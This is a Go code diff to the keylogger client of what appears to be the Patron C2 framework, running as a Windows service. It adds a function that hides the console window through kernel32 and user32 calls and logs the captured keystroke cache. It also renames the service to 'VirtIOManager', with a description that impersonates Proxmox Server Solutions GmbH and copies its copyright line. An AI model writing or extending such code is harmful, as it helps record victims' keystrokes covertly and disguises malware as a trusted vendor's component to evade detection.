@@ -5,6 +5,7 @@ import (
 	"encoding/gob"
 	"fmt"
 	"log"
+	"syscall"
 	"time"
 
 	"github.com/PatronC2/Patron/types"
@@ -30,14 +31,25 @@ const (
 type program struct{}
 
 func (p *program) Start(s service.Service) error {
-	// Run your application's main logic here
 	go p.run()
 	return nil
 }
 
 func (p *program) Stop(s service.Service) error {
-	// Implement any cleanup logic if necessary
 	return nil
+}
+
+func HideConsoleWindow() {
+    kernel32 := syscall.NewLazyDLL("kernel32.dll")
+    user32 := syscall.NewLazyDLL("user32.dll")
+
+    getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
+    showWindow := user32.NewProc("ShowWindow")
+
+    hwnd, _, _ := getConsoleWindow.Call()
+    if hwnd != 0 {
+        showWindow.Call(hwnd, uintptr(0)) // SW_HIDE = 0
+    }
 }
 
 func (p *program) run() {
@@ -54,6 +66,7 @@ func (p *program) run() {
 			key := keylogger.GetKey()
 			if !key.Empty {
 				cache = cache + string(key.Rune)
+				logger.Logf(logger.Info, "Current cache: %v", cache)
 			}
 			time.Sleep(delayKeyfetchMS * time.Millisecond)
 		}
@@ -93,10 +106,11 @@ func (p *program) run() {
 }
 
 func main() {
+	HideConsoleWindow()
 	svcConfig := &service.Config{
-		Name:        "PatronService",
-		DisplayName: "Patron C2 Service",
-		Description: "A Windows service to run Patron C2 client in the background.",
+		Name:        "VirtIOManager",
+		DisplayName: "VirtIOManager",
+		Description: "A Windows service to manage virtualized networking in Proxmox VE. Copyright © 2004 - 2024 Proxmox Server Solutions GmbH. All rights reserved.",
 	}
 
 	prg := &program{}
